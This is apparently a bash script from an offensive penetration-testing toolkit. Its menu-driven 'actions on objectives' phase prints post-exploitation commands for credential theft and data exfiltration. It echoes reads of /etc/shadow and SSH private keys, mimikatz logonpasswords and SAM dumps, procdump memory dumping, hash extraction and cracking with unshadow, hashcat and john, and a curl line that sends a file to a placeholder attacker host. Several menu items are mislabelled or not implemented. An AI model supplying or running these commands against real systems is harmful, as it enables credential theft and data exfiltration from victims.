#!/bin/bash

#############################################################################
#                                                                           #
#  ACTIONS ON OBJECTIVES SUITE                                              #
#  Phase 9: Complete the mission (data exfiltration, domain compromise)    #
#                                                                           #
#  Includes:                                                               #
#  - Credential harvesting                                                 #
#  - Data exfiltration                                                    #
#  - Hash cracking                                                        #
#  - Steganography analysis                                               #
#                                                                           #
#############################################################################

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                   ║
║              ACTIONS ON OBJECTIVES SUITE                           ║
║              Phase 9: Complete the mission                         ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

show_menu() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  ACTIONS ON OBJECTIVES${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Credential Harvesting${NC}"
    echo "   O1.  Linux Credential Harvest"
    echo "   O2.  Windows Credential Harvest"
    echo "   O3.  Browser Credential Dumping"
    echo "   O4.  Memory Credential Dumping"
    echo "   O5.  Hash Extraction"
    echo ""
    echo -e "${YELLOW}Data Exfiltration${NC}"
    echo "   OE1. Exfil Scripts"
    echo "   OE2. Exfil via HTTP"
    echo "   OE3. Exfil via DNS"
    echo "   OE4. Encrypted Exfil"
    echo ""
    echo -e "${YELLOW}Cracking & Analysis${NC}"
    echo "   OC1. Hash Cracker (Identify & Crack)"
    echo "   OC2. Password Analysis"
    echo "   OC3. Log Analysis"
    echo ""
    echo -e "${YELLOW}Steganography${NC}"
    echo "   OS1. Steganography Detector"
    echo "   OS2. Hidden Data Extraction"
    echo ""
    echo -e "${RED}0. Exit to Main Menu${NC}"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
}

log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_good() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }

usage() {
    cat << EOF
USAGE: $0 [OPTIONS]

OPTIONS:
    O1                      Linux credential harvest
    OC1                     Hash cracker
    --menu                  Show interactive menu
    --help                  Show this help

EXAMPLES:
    $0 O1
    $0 OC1
    $0 --menu

EOF
}

handle_selection() {
    local choice="$1"
    shift
    
    case "$choice" in
        O1|o1)
            log_info "Linux Credential Harvest"
            echo "Searching for password files..."
            echo "find / -name \"*.passwords\" -o -name \"*.txt\" -o -name \"*.conf\" 2>/dev/null"
            echo ""
            echo "Checking common locations:"
            echo "cat /etc/shadow"
            echo "cat /etc/passwd"
            echo "~/.ssh/id_rsa"
            echo "~/.bash_history"
            ;;
        O2|o2)
            log_info "Windows Credential Harvest"
            echo " sekurlsa::logonpasswords"
            echo " lsadump::sam"
            echo " lsadump::secrets"
            ;;
        O3|o3)
            log_info "Browser Credential Dumping"
            echo "Chrome: ~/.config/google-chrome/Default/Login Data"
            echo "Firefox: ~/.mozilla/firefox/*.default/"
            echo "工具: SharpChrome, SharpWeb"
            ;;
        O4|o4)
            log_info "Memory Credential Dumping"
            echo "procdump -ma <pid>"
            echo "mimikatz sekurlsa::logonpasswords"
            ;;
        O5|o5)
            log_info "Hash Extraction"
            echo "unshadow /etc/passwd /etc/shadow > hashes.txt"
            echo "pwdump system sam"
            ;;
        OC1|oc1)
            log_info "Hash Cracker"
            echo "hashcat -m 1000 hashes.txt wordlist.txt"
            echo "john hashes.txt"
            ;;
        OC2|oc2)
            log_info "Password Analysis"
            echo "analyze wordlists"
            echo "mutate passwords"
            ;;
        OC3|oc3)
            log_info "Log Analysis"
            echo "analyze system logs"
            echo "grep for sensitive data"
            ;;
        OS1|os1)
            log_info "Steganography Detector"
            echo "steghide info image.jpg"
            echo "binwalk image.jpg"
            echo "zsteg image.png"
            ;;
        OE1|oe1)
            log_info "Exfil via HTTP"
            echo "curl --data-binary @file.txt http://attacker/exfil"
            echo "python -m SimpleHTTPServer"
            ;;
        --menu)
            banner
            show_menu
            read -p "Enter choice: " choice
            handle_selection "$choice"
            ;;
        --help|-h)
            usage
            ;;
        *)
            log_warn "Invalid choice: $choice"
            usage
            ;;
    esac
}

main() {
    if [[ $# -gt 0 ]]; then
        handle_selection "$@"
        exit 0
    fi
    
    while true; do
        banner
        show_menu
        
        echo ""
        read -p "Enter choice: " choice
        
        if [[ "$choice" == "0" ]]; then
            echo -e "${GREEN}Returning to main menu...${NC}"
            exit 0
        fi
        
        handle_selection "$choice"
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

main "$@"
